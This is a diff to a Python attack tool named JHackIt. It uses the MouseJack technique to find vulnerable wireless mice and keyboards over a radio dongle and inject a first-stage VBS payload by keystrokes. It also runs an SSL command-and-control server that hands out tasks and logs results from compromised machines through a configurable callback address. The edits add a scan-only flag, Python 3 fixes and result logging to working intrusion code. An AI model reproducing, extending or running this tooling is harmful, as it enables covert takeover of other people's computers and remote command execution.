@@ -1,14 +1,16 @@
 #!/usr/bin/env python3
-import argparse, array, collections, datetime, jackit, json, os, random, re, socket, socketserver, ssl, string, sys, threading, time, uuid
+import os, sys
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+import argparse, array, collections, datetime, jackit, json, random, re, socket, socketserver, ssl, string, threading, time, uuid
 from jackit import duckyparser
 from jackit import mousejack
 from jackit import plugins
 
-LogBasePath = "."
+LogBasePath = os.path.join(os.getcwd(), "logs") 
 LocalListeningHost = "0.0.0.0"
 LocalListeningPort = 443
 
-ListeningServerName = "127.0.0.1"
+ListeningServerName = "<callback_address>"
 ListeningServerPort = 443
 
 SslEnabled = True
@@ -18,6 +20,7 @@ SslCertfile="certfile.crt"
 # OpenSSL command to generate a self-signed cert for SSL:
 # openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout keyfile.key -out certfile.crt
 
+# A unique User-Agent used as a test for against forensic probing
 ClientUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.1O2 Safari/537.36"
 
 FirstStagePayload = "VbsClientStage1.duck"
@@ -63,8 +66,6 @@ UserAgentRe = re.compile("User-Agent:\s+(?P<UserAgent>.+?)\n")
 # Regular expression for finding the requested path value.
 UriPathRe = re.compile("(POST|GET) (?P<path>.+?) (HTTP/1\.1)")
 
-#TaskingRe = re.compile(r"(?P<Key>[a-zA-Z0-9_]+)\s*=\s*(((?P<quote>['\"])(?P<QuotedStringValue>.*?)(?<!\\)(?P=quote))|(?P<IntegerValue>\d+(\.\d+)?)|(?P<UnQuotedStringValue>[^\s]+))")
-
 __version__ = 1.01
 __attack_log_path__ = "jhackit_attack_log.json"
 __attack_log__ = {}
@@ -107,6 +108,7 @@ parser.add_argument('--no-reset', help='Reset CrazyPA dongle prior to initalizat
 parser.add_argument('--keep-attacking', help='Keep attacking any previously attacked hosts.', action='store_true')
 parser.add_argument('--whitelist-path', default="", help="White-list of specific devices to attack.")
 parser.add_argument('--blacklist-path', default="", help="Black-list of specific devices to skip attacking.")
+parser.add_argument('--scan', help="Scan for devices, ping them, but skip attack.", action='store_true')
 
 def read_attack_log():
     global __attack_log__
@@ -184,7 +186,7 @@ def UnregisterPath(path=""):
     if path in RegisteredPaths:
         del RegisteredPaths[path]
 
-def do_attack(jack, addr_string, target, attack="", use_ping=True):
+def do_attack(jack, addr_string, target, scan_only=False, layout="us", attack="", use_ping=True):
     global __attack_log__
 
     payload  = target['payload']
@@ -238,18 +240,22 @@ def do_attack(jack, addr_string, target, attack="", use_ping=True):
         NewClient = Client()
         
         try:
-            parser = duckyparser.DuckyParser(NewClient.GetFirstStage(), layout=layout.lower())
-        except:
+            first_stage = NewClient.GetFirstStage()
+            #print(first_stage)
+            parser = duckyparser.DuckyParser(first_stage, layout=layout.lower())
+        except Exception as ex:
             print("[-] Exception encountered while parsing the first-stage duck script.")
+            print(ex)
             return
         attack = parser.parse()
 
         if attack == "":
             print("[-] No attack payload given; returning.")
             return
-            
-        print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), lock_channel))
-        jack.attack(hid(address, payload), attack)
+        
+        if not scan_only:
+            print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), lock_channel))
+            jack.attack(hid(address, payload), attack)
         __attack_log__[addr_string]['attacked'] = True
     
     #else:
@@ -305,7 +311,7 @@ def scan_loop(jack, interval, address=None):
     else:
         jack.scan(interval)
     
-    for addr_string, device in iteritems(jack.devices):
+    for addr_string, device in jack.devices.items():
         if device['device']:
             device_name = device['device'].description()
         else:
@@ -340,8 +346,9 @@ class Tasking:
 
     def GetResults(self):
         if self.results:
-            print("\n[+] Successfully ran command: {} [{}]".format(self.command, self.id))
-            print("[+] Results:\n\t{}\n".format(self.results))
+            ResultsString = ("[+] Successfully ran command: {}\n".format(self.id))
+            ResultsString += ("[+] Results:\n\t{}\n".format(self.results))
+            return ResultsString
         
     def ValidateTasking(self):
         self.is_valid = False
@@ -418,9 +425,6 @@ class Client:
         else:
             Payload = Payload.replace(HostAndPort_Replace_String, "{}:{}".format(ListeningServerName, ListeningServerPort))
         Payload = Payload.replace(UriPath_Replace_String, self.initialpath)
-        #with open((os.path.join(LogBasePath, "first_stage_payload.vbs")), "w") as f:
-        #    f.write(Payload)
-        #print("[+] Generated first-stage payload: {}".format((os.path.join(LogBasePath,"first_stage_payload.vbs"))))
         print("[+] Generated first-stage payload for {}".format(self.id))
         return Payload
         
@@ -492,7 +496,7 @@ class Client:
             if data.strip().startswith("POST"):
                 for completed_task in filter(lambda x: x.next_path == path.split("?")[0], self.sent_tasking):
                     completed_task.results = data
-                    #completed_task.GetResults()
+                    LogString(completed_task.GetResults(), self.id)
             
             # Unregister the path to detect and prevent any replay attacks.
             UnregisterPath(path.split("?")[0])
@@ -630,7 +634,7 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
         
         CurrentClient.ipaddress = SourceAddress
         CurrentClient.port = SourcePort
-        CurrentClient.RegisterCallback(RequestedPath, data=self.data)
+        #CurrentClient.RegisterCallback(RequestedPath, data=self.data)
         
         LogString("[!] Connection from known client {}:{} => {}".format(SourceAddress, SourcePort, CurrentClient.id), "", False)
         
@@ -641,7 +645,6 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
         if ContentLengthMatch:
             try:
                 # If content-length implies there is more data to receive, though less data than the maximum allowable size, try to receive it.
-                #if int(ContentLengthMatch.group("ContentLength")) + len(self.data) > InitialRecvBuffer and int(ContentLengthMatch.group("ContentLength")) + len(self.data) <= MaxRecvSize:
                 if int(ContentLengthMatch.group("ContentLength")) + len(self.data) > 0 and int(ContentLengthMatch.group("ContentLength")) + len(self.data) <= MaxRecvSize:
                     #LogString("[*] Request Content-Length larger than InitialRecvBuffer - Receiving remaining data...", ClientId)
                     
@@ -652,6 +655,8 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
             except:
                 LogString("[-] Unable to find, parse, and validate Content-Length field in request - abandoning connection.", ClientId)
                 return
+        
+        CurrentClient.RegisterCallback(RequestedPath, data=self.data)
         
         #print(self.data)
         
@@ -692,7 +697,7 @@ class ThreadedTcpSslServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 class ThreadedTcpServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
     pass
 
-if __name__ == "__main__":
+def Launch():
     global __attack_log__
     args = parser.parse_args()
     print("JHackIt Version %0.2f -- Forrest" % __version__)
@@ -709,28 +714,11 @@ if __name__ == "__main__":
     try:
         jack = mousejack.MouseJack(args.lowpower, args.debug, (not args.no_reset))
     except Exception as e:
-        if e.__str__() == "Cannot find USB dongle.":
-            print(R+'[!] '+W+"Cannot find Crazyradio PA USB dongle with Mousejack firmware.")
-            exit(-1)
-        else:
-            raise e
+        print(R+'[!] '+W+"Exception encounted wile finding or could not find Crazyradio PA USB dongle with Mousejack firmware.")
+        exit(-1)
     
     print("[!] Starting local tasking server. Use CTRL-C to initiate shutdown.")
     
-    ##########################################
-    # Jackit should call for the instantiation of a client and generation of the first-stage when attacking a device.
-    firstStageClient = Client()
-    firstStageClient.GetFirstStage()
-    
-    f = open(script, 'r')
-        try:
-            parser = duckyparser.DuckyParser(f.read(), layout=layout.lower())
-        except KeyError:
-            print("Invalid layout specified")
-            exit(-1)
-        attack = parser.parse()
-    ##########################################
-        
     # Create a new threaded server.
     if SslEnabled:
         server = ThreadedTcpSslServer((LocalListeningHost, LocalListeningPort), ThreadedTCPRequestHandler)
@@ -752,13 +740,13 @@ if __name__ == "__main__":
     blacklist = []
     if args.whitelist_path and os.path.isfile(args.whitelist_path):
         with open(args.whitelist_path, "r") as f:
-            whitelist = map(lambda x: x.strip().upper(), filter(lambda y: y.strip() != "", f.readlines()))
+            whitelist = list(map(lambda x: x.strip().upper(), filter(lambda y: y.strip() != "", f.readlines())))
         if len(whitelist) > 0:
             print(O+"[!] "+W+("Using a whitelist consisting of {} device(s)...".format(len(whitelist))))
 
     if args.blacklist_path and os.path.isfile(args.blacklist_path):
         with open(args.blacklist_path, "r") as f:
-            blacklist = map(lambda x: x.strip().upper(), filter(lambda y: y.strip() != "", f.readlines()))
+            blacklist = list(map(lambda x: x.strip().upper(), filter(lambda y: y.strip() != "", f.readlines())))
         if len(blacklist) > 0:
             print(O+"[!] "+W+("Using a blacklist consisting of {} device(s)...".format(len(blacklist))))
     
@@ -770,8 +758,7 @@ if __name__ == "__main__":
     try:
         while True:
             scan_loop(jack, args.interval, args.address)
-            for addr_string, device in iteritems(jack.devices):
-                
+            for addr_string, device in jack.devices.items():
                 # If a whitelist was used, don't attack anything not in the whitelist.
                 # If a blacklist was used, don't attack anything in the blacklist.
                 if (len(whitelist) > 0 and addr_string not in whitelist) or (len(blacklist) > 0 and addr_string in blacklist):
@@ -779,7 +766,7 @@ if __name__ == "__main__":
 
                 # Only attack things that haven't been attacked, unless keep-attacking was specified
                 if addr_string not in __attack_log__ or not __attack_log__[addr_string]['attacked'] or args.keep_attacking:
-                    do_attack(jack, addr_string, device)
+                    do_attack(jack, addr_string, device, scan_only=args.scan, layout=args.layout)
                     update_attack_log()
 
     except KeyboardInterrupt:
@@ -798,7 +785,7 @@ if __name__ == "__main__":
     pinged_devices = 0
     hidless_devices = 0
     total_devices = len(__attack_log__)
-    for addr_string, device in iteritems(__attack_log__):
+    for addr_string, device in __attack_log__.items():
         if device['attacked']:
             pinged_devices += 1
         if device['no_hid']:
@@ -807,3 +794,6 @@ if __name__ == "__main__":
     print("Pinged Devices:  {}".format(pinged_devices))
     print("Hidless Devices: {}".format(hidless_devices))
     print("Total Devices:   {}".format(total_devices))
+
+if __name__ == "__main__":
+    Launch()
